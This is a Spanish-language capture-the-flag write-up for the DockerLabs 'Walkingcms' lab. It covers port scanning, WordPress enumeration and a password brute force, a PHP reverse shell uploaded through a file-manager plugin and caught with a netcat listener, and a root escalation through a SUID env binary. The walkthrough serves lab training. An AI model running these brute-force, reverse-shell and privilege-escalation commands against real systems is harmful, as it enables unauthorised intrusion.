![image](https://github.com/user-attachments/assets/5d5059e5-32ec-45c1-a72f-38824d7ceffe)---
title: Walkingcms - DockerLabs
published: true
categories: DockerLabs
---


| OS     | Dificultad  | Creator           |
| ------ | ----------- | -------------     | 
| Linux  |  Fácil      | El Pingüino de Mario        | 


# Reconocimiento

Comenzamos el proceso de reconocimiento identificando los puertos abiertos en el sistema objetivo. 
```shell
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG ports 
```
-  `-p-`: Escanea todos los puertos (1-65535).
- `--open`: Solo muestra los puertos abiertos.
- `-sS`: Realiza un escaneo SYN, que es rápido y discreto.
- `--min-rate=5000`: Envía al menos 5000 paquetes por segundo, acelerando el escaneo.
- `-n`: No realiza resolución DNS.
- `-Pn`: No realiza ping previo para determinar si el host está activo.
- `-vvv`: Muestra resultados detallados y en tiempo real.

![image](https://github.com/user-attachments/assets/77dd604e-5f54-4f49-88d9-895340426162)

Durante el escaneo, descubrimos que los siguientes puertos están activos:
- `80` (HTTP)
A continuación, evaluamos si los puertos abiertos presentan alguna vulnerabilidad, además de obtener más información sobre los servicios asociados a esos puertos.
```bash
nmap -p80 -sCV 172.17.0.2 -oG targeted
```
![image](https://github.com/user-attachments/assets/75e7bf0e-7097-4921-b52b-9ec1ed2d04fa)

# Exploración Web
Al analizar el puerto `80`, encontramos una página de defecto de apache.

![image](https://github.com/user-attachments/assets/c43ac784-f5dd-4088-b5a9-5570e59d20d1)


Utilizamos `Gobuster` para realizar un reconocimiento web y explorar los directorios disponibles en el sitio.
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,doc,html,txt,img
```
- `gobuster dir` - Indica que estás utilizando la herramienta Gobuster para realizar un escaneo de directorios.
- `-u http://172.17.0.2/` Especifica la URL objetivo que deseas escanear en busca de directorios.
- `-w` Especifica que diccionario queremos usar
- `-x` Para indicar que tipo de extension queremos que nos encuentre

![image](https://github.com/user-attachments/assets/7c400ad1-d895-4407-9e79-33f7b4332f76)

Identificamos la ruta `/wordpress`.

# Wordpress

Usaremos `Wpscan` para ver que encontramos dentro.

```bash
wpscan --url http://172.17.0.2/wordpress -e 
```
![image](https://github.com/user-attachments/assets/6523fb18-311e-40ae-b49b-eae65ac1cd09)

Encontramos un usuario mario , lo que haremos sera fuerza bruta para acceder.

## Fuerza bruta.

```bash
wpscan --url http://172.17.0.2/wordpress -U mario -P /usr/share/wordlists/rockyou.txt
```

Encontramos una contraseña la cual es `love`.

![image](https://github.com/user-attachments/assets/d3ebd0d3-b0d9-4bfb-b631-bcf668240a65)

Accedemos con mario

Somos administradores por lo que añadiremos el plugin `FILE MANAGER` todo esto para añadir un `shell.php` y poder acceder a traves de una revershell.

## Reverse Shell

Creamos un archivo `shell.php` y cargamos una reverse shell usando la herramienta [Reverseshell de Pentest Monkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) para crear una shell en PHP. La reverse shell se encuentra disponible en:

![image](https://github.com/user-attachments/assets/f8cd26c8-08bb-459d-b45b-5f761626f3e1)

Una vez subido el archivo, accedemos a la ruta `/wordpress/shell.php` y ejecutamos la shell.

No salta un mensaje de que se ha subido el archivo accedmos a la ruta /uploads y lo ejecutamos 

![image](https://github.com/user-attachments/assets/168111df-59fd-4757-9416-3b8aa36be241)

Simultáneamente, iniciamos `netcat` en nuestro sistema para escuchar conexiones entrantes:
```bash 
nc -lvnp 4444
```
Al acceder a la reverse shell desde el navegador, logramos obtener acceso como `www-data`.

![image](https://github.com/user-attachments/assets/4456d8d6-70d2-4f81-9684-0e5685581680)

Logramos acceso como` www-data`.

![image](https://github.com/user-attachments/assets/f06c2d36-dd9d-498e-bba4-20fb4e8df2e3)

## TTY ReverseShell

### Iniciar una sesión de shell interactiva
En nuestra shell básica, ejecutamos el siguiente comando para forzar la creación de una sesión de bash interactiva:
```bash
script /dev/null -c bash
```
### Suspender la shell
Una vez que el comando anterior está en ejecución, utilizamos
```bash
Control+Z
```
para suspender temporalmente nuestra shell.

### Preparar nuestro terminal local:
Antes de volver a nuestra shell, configuramos nuestro terminal local:
```bash
stty raw -echo; fg
```

### Resetear la configuración del terminal
Ahora que tenemos el control de la shell, la reseteamos para asegurar que se comporta correctamente:
```bash
reset
```

### Configura el tipo de terminal:
```bash
xterm
export TERM=xterm
export SHELL=bash
```

# Escalada de Privilegios

Usamos el siguiente comando (haz una explicacion para que sirve el comando).

```bash
find / -perm -4000 2>/dev/null
```

Vemos que podemos ejecutar `env` , por lo que ejecutamos el siguiente comando.

```bash
/usr/bin/env /bin/sh -p
```

Ya somos root

![image](https://github.com/user-attachments/assets/46fca506-c321-431e-8c4a-50f1c08fac4a)
